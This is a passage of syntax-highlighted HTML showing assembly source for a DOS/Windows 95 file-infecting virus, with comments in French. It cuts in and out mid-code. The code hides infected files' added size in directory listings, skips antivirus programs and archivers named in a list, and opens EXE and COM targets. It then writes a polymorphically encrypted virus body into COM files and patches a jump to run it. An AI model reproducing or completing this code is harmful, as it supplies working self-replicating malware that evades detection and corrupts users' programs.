</span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">pas_fini</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;maintenant es:di pointe vers la zone de description</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                       </span><span class="sc1">;pourquoi pas plus? a tester sur noms longs</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                 </span><span class="sc1">;sauver es:di qui pointe vers</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                                 </span><span class="sc1">;zone description</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer_name</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">  </span><span class="sc1">;stock nom</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2ch</span><span class="sc0">             </span><span class="sc1">;es:di+2Ch = zone nom long</span><span class="sc0">
</span><span class="sc5">find_extension</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"."</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">verifie_extension</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">find_extension</span><span class="sc0">
</span><span class="sc5">verifie_extension</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsw</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"IZ"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_a_zip</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"P"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_a_zip</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                                       </span><span class="sc1">;si zip: nom en asciiz</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc1">;remettre es:di sur la zone descr</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infecte_zip_from_w95</span><span class="sc0">       </span><span class="sc1">;le nom est déja dans le buffer</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">leave_win_stealth</span><span class="sc0">

</span><span class="sc5">not_a_zip</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc1">;remettre es:di sur la zone descr</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;time in dos format</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00011111b</span><span class="sc0">               </span><span class="sc1">;just look at seconds</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00001111b</span><span class="sc0">               </span><span class="sc1">;seconds = 30?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">leave_win_stealth</span><span class="sc0">

</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000011111100000b</span><span class="sc0">       </span><span class="sc1">;get virus poly added size</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">30</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">;substract virus size</span><span class="sc0">
</span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">22h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">leave_win_stealth</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;si date en format DOS, c'est 0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">leave_win_stealth2</span><span class="sc0">          </span><span class="sc1">;pour éviter 2 traductions de date à la suite</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">71A7h</span><span class="sc0">                   </span><span class="sc1">;translate DOS time/date to W95 time/date</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;time in dos format</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;date in dos format</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc0">                     </span><span class="sc1">;8 bytes buffer for new time date W95</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">leave_win_stealth2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
</span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc1">;********************* INFECTION *************************************** </span><span class="sc0">

</span><span class="sc5">infecte</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">

</span><span class="sc1">; 1) Ne pas infecter un anti-virus</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                              </span><span class="sc1">;ds:dx = offset nom, dans si</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">av_liste</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">     </span><span class="sc1">;dans di, offset liste des AV</span><span class="sc0">

</span><span class="sc5">cherche_extension</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;recherche debut de l'extension</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"."</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">cherche_extension</span><span class="sc0">

</span><span class="sc6">lodsw</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_ext</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">;mettre extension en memoire</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_ext</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">cherche_debut</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;recherche du debut du nom</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc13">"\"
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">cherche_debut</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_name</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">         </span><span class="sc1">;mettre en memoire segment/offset</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_name</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">;du nom du fichier</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">;scasw utilise es:di donc ajustage </span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                          </span><span class="sc1">;du segment (liste ds partie residente)</span><span class="sc0">
                    
</span><span class="sc6">lodsw</span><span class="sc0">                           </span><span class="sc1">;recup 2 premieres lettres</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">                      </span><span class="sc1">;12 AV a comparer+ COMMAND.COM</span><span class="sc0">
</span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasw</span><span class="sc0">                     </span><span class="sc1">;on compare</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">av_ok</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">redonne_la_main</span><span class="sc0">             </span><span class="sc1">;si c'est un AV</span><span class="sc0">
</span><span class="sc5">av_ok</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">stealth_non</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;switch to zero</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                                               </span><span class="sc1">;5 archivers</span><span class="sc0">
</span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasw</span><span class="sc0">                                             </span><span class="sc1">;test names</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">zip_ok</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">stealth_non</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">         </span><span class="sc1">;it's an archiver</span><span class="sc0">
</span><span class="sc5">zip_ok</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; 2) ouvrir le fichier et lire son header</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_name</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;nom du fichier dans</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_name</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;ds:dx pour attributs UTILE?</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recup_attribs</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">annule_attribs</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">open_file</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">cont</span><span class="sc0">                 </span><span class="sc1">;si pas de probleme, on continue</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">redonne_la_main_attributs</span><span class="sc0">      </span><span class="sc1">;en cas de couille, on n'infecte pas</span><span class="sc0">

</span><span class="sc5">cont</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                                     </span><span class="sc1">;handle ds bx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_handle</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                  </span><span class="sc1">;CS=segment du virus. A partir de maintenant, on </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                  </span><span class="sc1">;est dans le virus. Il faut donc que tous les    </span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                   </span><span class="sc1">;registres de segment (ES et DS) pointent vers   </span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                   </span><span class="sc1">;le segment du virus, sinon couille garantie  </span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recup_timedate</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1ch</span><span class="sc0">                                    </span><span class="sc1">;des 5 premiers octets</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">             </span><span class="sc1">;on les met ds leur zone mem</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_file</span><span class="sc0">

</span><span class="sc1">; 3) selon l'extension, se diriger vers une des 2 routines d'infection</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_ext</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"XE"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">compare_suite</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_ext</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"E"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">compare_suite</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">infecte_exe</span><span class="sc0">

</span><span class="sc5">compare_suite</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_ext</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"OC"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">pas_bonne_ext</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_ext</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"M"</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infecte_com</span><span class="sc0">

</span><span class="sc5">pas_bonne_ext</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ferme_et_redonne_la_main_sans_infection</span><span class="sc0">

</span><span class="sc1">; 4) INFECTION DES COM</span><span class="sc0">

</span><span class="sc5">infecte_com</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"i"</span><span class="sc0">    </span><span class="sc1">;c'est un .com deja infecte? </span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">pas_bonne_ext</span><span class="sc0">                                </span><span class="sc1">;oui =&gt; pas touche </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;c'est EXE deguisé en COM?? </span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                                      </span><span class="sc1">;somme de M+Z</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0A7h</span><span class="sc0">                                     </span><span class="sc1">;  !!!evite flag Z!!!</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">pas_bonne_ext</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_virus</span><span class="sc0">       </span><span class="sc1">;transfert des 4 octets</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">contenu</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_virus</span><span class="sc0">       </span><span class="sc1">;originaux de exehead a</span><span class="sc0">
</span><span class="sc6">movsw</span><span class="sc0">                                           </span><span class="sc1">;contenu</span><span class="sc0">
</span><span class="sc6">movsw</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pointeur_fin</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">57000</span><span class="sc0">                                   </span><span class="sc1">;pas d'infection si</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">verif_trop_petit</span><span class="sc0"> 
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ferme_et_redonne_la_main_sans_infection</span><span class="sc0">     </span><span class="sc1">;le .com est &gt; 56000</span><span class="sc0">
</span><span class="sc5">verif_trop_petit</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">999</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">ecriture_com</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ferme_et_redonne_la_main_sans_infection</span><span class="sc0">     </span><span class="sc1">;ou &lt; 500</span><span class="sc0">

</span><span class="sc5">ecriture_com</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                   </span><span class="sc1">;taille-3 (coz JMP au debut)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">;taille va servir pour le JMP</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">103h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">taille_fse</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">     
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">com_fse</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">marqueur_inf</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,-</span><span class="sc2">7</span><span class="sc0">                   </span><span class="sc1">; read last 7 bytes, for ENUNS</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">; check</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">enuns7</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">POLY_FROM_RESIDENT</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;---ecriture du corps crypté dans le nouveau fichier---------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_handle</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_file</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">size_for_stealth</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_virus</span><span class="sc0">       </span><span class="sc1">;ajustement du buffer</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">                                    </span><span class="sc1">;avec un jump</span><span class="sc0">
